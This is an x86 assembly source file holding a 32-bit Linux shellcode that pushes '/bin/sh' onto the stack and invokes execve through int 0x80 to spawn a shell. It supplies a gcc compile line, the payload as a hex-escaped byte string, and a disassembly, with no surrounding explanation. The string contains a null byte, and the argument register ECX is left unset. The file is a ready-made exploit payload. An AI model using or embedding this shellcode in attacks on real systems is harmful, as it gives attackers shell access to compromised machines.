/*

compile: gcc -m32 -nostdlib x86-bin-sh.s

code: \x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x53\x31\xd2\x52\x6a\x0b\x58\xcd\x80

<_start>:
68 2f 73 68 00        push   0x68732f
68 2f 62 69 6e        push   0x6e69622f
89 e3                 mov    ebx,esp
53                    push   ebx
31 d2                 xor    edx,edx
52                    push   edx
6a 0b                 push   0xb
58                    pop    eax
cd 80                 int    0x80

*/
    .intel_syntax noprefix
    .global _start
_start:
    push 0x68732f
    push 0x6e69622f
    mov ebx, esp
    push ebx
    xor edx, edx
    push edx
    push 11
    pop eax
    int 0x80
